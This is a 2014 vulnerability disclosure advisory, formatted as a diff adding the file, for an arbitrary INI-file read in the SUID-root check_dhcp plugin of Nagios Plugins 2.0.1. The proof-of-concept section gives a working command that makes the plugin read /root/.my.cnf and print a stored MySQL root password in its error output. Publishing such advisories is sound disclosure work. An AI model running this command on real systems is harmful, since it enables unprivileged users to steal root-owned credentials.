@@ -1,0 +1,189 @@
+=============================================
+- Release date: 15.05.2014
+- Discovered by: Dawid Golunski
+- Severity: Moderate
+=============================================
+
+ 
+I. VULNERABILITY
+-------------------------
+
+check_dhcp - Nagios Plugins <= 2.0.1 Arbitrary Option File Read  
+
+ 
+II. BACKGROUND
+-------------------------
+
+"Nagios is an open source computer system monitoring, network monitoring and 
+infrastructure monitoring software application. Nagios offers monitoring and
+alerting services for servers, switches, applications, and services. 
+It alerts the users when things go wrong and alerts them a second time when
+the problem has been resolved.
+
+Nagios Plugins (Official)
+
+The Nagios Plugins Development Team maintains a bundle of more than fifty 
+standard plugins for Nagios and other monitoring applications that use the 
+straightforward plugin interface originally invented by the Nagios folks. 
+Each plugin is a stand-alone command line tool that provides a specific type 
+of check. Typically, your monitoring software runs these plugins to determine
+the current status of hosts and services on your network.
+
+Some of the provided plugins let you check local system metrics (such as load 
+averages, processes, or disk space usage), others use various network protocols
+ (such as ICMP, SNMP, or HTTP) to perform remote checks. 
+This allows for checking a large number of common host and service types. 
+
+
+* check_dhcp plugin
+
+This plugin tests the availability of DHCP servers on a network."
+ 
+III. INTRODUCTION
+-------------------------
+
+check_dhcp plugin that is a part of the official Nagios Plugins package contains 
+a vulnerability that allows a malicious attacker to read parts of INI
+config files belonging to root on a local system. It could allow an attacker
+to obtain sensitive information like passwords that should only be accessible 
+by root user.
+
+The vulnerability is due to check_dhcp plugin having Root SUID permissions and
+inappropriate access control when reading user provided config file.
+
+IV. DESCRIPTION
+-------------------------
+ 
+
+check_dhcp requires a root SUID permission on the program binary file in order to run
+correctly. Default installation of check_dhcp when installed from sources assigns
+the setuid bit automatically on the file:
+
+# ./configure ; make ; make install
+
+# ls -l /usr/local/nagios/libexec/check_dhcp
+-r-sr-xr-x 1 root root 171188 May 12 23:26 /usr/local/nagios/libexec/check_dhcp
+
+
+As we can see in the provided help the plugin allows for reading options from a
+supplied config file by using --extra-opts option:
+
+# /usr/local/nagios/libexec/check_dhcp --help                                    
+check_dhcp v2.0.1 (nagios-plugins 2.0.1)
+...
+Usage:
+ check_dhcp [-v] [-u] [-s serverip] [-r requestedip] [-t timeout]
+                  [-i interface] [-m mac]
+
+Options:
+...
+ --extra-opts=[section][@file]
+    Read options from an ini file. See
+    https://www.nagios-plugins.org/doc/extra-opts.html
+    for usage and examples.
+
+
+The option could be used to read parts of any INI format config files
+available on the system.  Because check_dhcp is running as root (thanks 
+to SETUID bit) and does not drop the root privileges when accessing the 
+config file nor does it check if a given file should be accessible by the 
+user executing it any root ini-config file can be accessed this way by an 
+unprivileged user on the local system. 
+
+Ironically, the extra-opts.html document states
+"The initial use case for this functionality is for hiding passwords, so
+you do not have to define sensitive credentials in the Nagios configuration
+and these options won't appear in the command line."
+
+ 
+V. PROOF OF CONCEPT
+-------------------------
+ 
+A good example of a program that stores configuration in INI format is MySQL. 
+Administrators often save mysql credentials in /root/.my.cnf to avoid having 
+to type them each time when running a mysql client. Storing mysql passwords in
+a config file is also suggested for safety in MySQL docs : 
+http://dev.mysql.com/doc/refman/5.7/en/password-security-user.html
+
+An example mysql config file could look like this:
+
+# cat /root/.my.cnf 
+[mysqldump]
+quick
+
+[mysql]
+# saved password for the mysql root user
+password=myRootSecretMysqlPass123
+
+
+If an unprivileged attacker had access to a system containing SUID binary of
+check_dhcp plugin he could easily use it to retrieve the password contained 
+in /root/.my.cnf file:
+
+[attacker@localhost ~]$ id
+uid=500(attacker) gid=500(attacker) groups=500(attacker)
+
+[attacker@localhost ~]$ /usr/local/nagios/libexec/check_dhcp -v --extra-opts=mysql@/root/.my.cnf
+/usr/local/nagios/libexec/check_dhcp: unrecognized option '--password=myRootSecretMysqlPass123'
+Usage:
+ check_dhcp [-v] [-u] [-s serverip] [-r requestedip] [-t timeout]
+                  [-i interface] [-m mac]
+
+
+As we can see the contents of the 'mysql' section of /root/.my.cnf option 
+file gets printed  as a part of the error message revealing its contents to 
+the attacker. 
+
+
+
+VI. BUSINESS IMPACT
+-------------------------
+
+Malicious user that has local access to a system where check_dhcp plugin is 
+installed with SUID could exploit  this vulnerability to read any INI format 
+config files owned by root and  potentially extract some sensitive information.
+ 
+VII. SYSTEMS AFFECTED
+-------------------------
+
+Systems with check_dhcp SUID binary installed as a part of Nagios Plugins 2.0.1 or older
+are vulnerable.
+ 
+VIII. SOLUTION
+-------------------------
+
+Remove SETUID permission bit from the check_dhcp binary file if the plugin is not used.
+Vendor has been informed about the vulnerability prior to release of this advisory. 
+Install a newer version of the plugin when released by vendor.
+ 
+IX. REFERENCES
+-------------------------
+
+http://exchange.nagios.org/directory/Plugins/*-Plugin-Packages/Nagios-Plugins-%28Official%29/details
+http://www.nagios-plugins.org/download/nagios-plugins-2.0.1.tar.gz
+https://nagios-plugins.org/doc/extra-opts.html
+http://en.wikipedia.org/wiki/Setuid
+http://en.wikipedia.org/wiki/INI_file
+http://dev.mysql.com/doc/refman/5.7/en/password-security-user.html
+
+http://legalhackers.com/advisories/nagios-check_dhcp.txt 
+
+X. CREDITS
+-------------------------
+
+The vulnerability has been discovered by Dawid Golunski
+dawid (at) legalhackers (dot) com
+legalhackers.com
+ 
+XI. REVISION HISTORY
+-------------------------
+
+May 12th, 2014:  Advisory created
+ 
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
+
